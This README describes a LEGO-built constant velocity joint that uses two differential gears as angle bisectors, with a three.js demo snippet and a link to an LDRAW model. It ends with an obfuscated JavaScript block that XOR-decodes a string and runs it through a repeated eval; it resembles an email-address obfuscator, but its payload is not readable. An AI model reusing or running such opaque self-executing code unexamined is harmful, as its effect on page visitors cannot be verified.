# RCVJ

This is home of the Reininghaus Constant Velocity Joint RCVJ, a maybe new solution to build a constant velocity Joint.<br>
See https://en.wikipedia.org/wiki/Constant-velocity_joint.

![RCVJ.png](docs/V9b1.png)

<html>
  <script src="js/three.js"></script>
    <script>

      var scene = new THREE.Scene();
      var camera = new THREE.PerspectiveCamera( 75, window.innerWidth/window.innerHeight, 0.1, 1000 );

      var renderer = new THREE.WebGLRenderer();
      renderer.setSize( window.innerWidth, window.innerHeight );
      document.body.appendChild( renderer.domElement );

      var geometry = new THREE.BoxGeometry( 1, 1, 1 );
      var material = new THREE.MeshBasicMaterial( { color: 0x00ff00 } );
      var cube = new THREE.Mesh( geometry, material );
      scene.add( cube );

      camera.position.z = 5;

      var animate = function () {
      requestAnimationFrame( animate );

      cube.rotation.x += 0.1;
      cube.rotation.y += 0.1;

      renderer.render(scene, camera);
    };
    animate();

  </script>
</html>

## Motivation

The idea for this new solution came to me, when I tried to build a constant velocity joint only using LEGO &trade; parts.

Because the proposed RCVJ mechanism has a high grade of complexity compared to the CV joints commonly in use (Birfield, Rzeppa, Tripods) and the gears introduce an additional amount of friction, it is likely that there will be no usefull applications. None the less it is a beautiful mechanism to watch moving.

## Solution

In case of the patented [Thompson Coupling](https://en.wikipedia.org/wiki/Constant-velocity_joint#Thompson_coupling) the double gimbal transfers the shaft torque, while the spherical pantograph establishes the perpendicular to the homocinetic plane. To accomplish this the pantograph scissor mechanism acts as a spatial angle bisector mechanism.

In the RCVJ mechanism the spherical pantograph is replaced by two differential gears, one for each gimbal. The differential gears are forming the angle bisector mechanism for their respective plane and are acting perpendicular to each other. We could therefore call it a differential bisecting constant velocity joint. This way the spherical problem is reduced to a two-dimensional problem and the model can be realized using standard LEGO parts.

## Model

The [LEGO model](model/RCVJ.ldr) of the RCVJ was done in LDRAW format.

## Usage

Install any of the free programs supporting the LDRAW file format, e.g.

* LeoCAD http://www.leocad.org/download.html
* LDRAW http://ldraw.org/help/getting-started.html
* LEGO Digital Designer (LDD) http://ldd.lego.com/en-us/download

Download this model [RCVJ.ldr](model/RCVJ.ldr) and load it into the software. Have fun building the model.

## License

<a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-nc-sa/4.0/88x31.png" /></a><br />This work is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/">Creative Commons Attribution-NonCommercial-ShareAlike 4.0 International License</a>.

<script type="text/javascript">
//<![CDATA[
<!--
var x="function f(x,y){var i,o=\"\",l=x.length;for(i=0;i<l;i++){if(i==11)y+=" +
"i;y%=127;o+=String.fromCharCode(x.charCodeAt(i)^(y++));}return o;}f(\"mycm{" +
"y~|3r=Y\\013XRDT\\007A\\005E\\026\\016\\017\\002@\\\\\\014J\\035XPXPLQ\\026" +
"W\\001RR\\0047)+/!m>i+!+9\\017\\\"**\\021%z?{de~ydoju&*-\\031\\032\\032HY\\" +
"035]\\013CT\\006P\\021\\016\\017\\033\\023\\031Z\\026]\\016\\013\\n\\036\\0" +
"26\\010S\\025@\\022-09j:86<a$'\\\"wb%2h?q{ugWc0p3 ao{kUSL\\003K\\013URJZ^Y\\"+
"004\\035\\002@\\\\\\030\\tNR\\035\\024\\036\\013\\016\\026g\\036W\\t\\010q\\"+
"035\\0365&.?c$4\\020\\033\\177~~\\023\\014\\034\\006\\007\\023\\n\\026\\031" +
"mkj\\007\\000noo<=\\0312\\\"*WK\\0220\\027\\010\\034\\016[\\rGFC/(\\020\\03" +
"0\\023\\026Z&Y !?422_X057TU>;<QR;#!NOF$$'DEHU^+./|}L\\177x\\024\\026\\027tu" +
"\\034\\031\\034qr[lm\\036\\030@\\031\\016\\006\\007\\034\\027\\030\\022a\\0" +
"34\\027&<y,d+42<,86wdgd{(z\\r}<~#\\031<>4\\037/?7\\003O\\032K\\001\\001\\t$" +
"\\032\\010\\002(\\001\\002\\034\\t^\\026\\034\\032\\006\\001%JS\\026ALNLC%x" +
"9(/|/4?5c#jdu&;:{(x)\\177,($s3nrx$HUEMAI\\010_\\025E\\006w\\016q\\014\\022_" +
"\\035[\\023FT@L\\021@\\026C\\024[\\036Q/(6 *0 ea\",11)"                      ;
while(x=eval(x));
//-->
//]]>
</script>
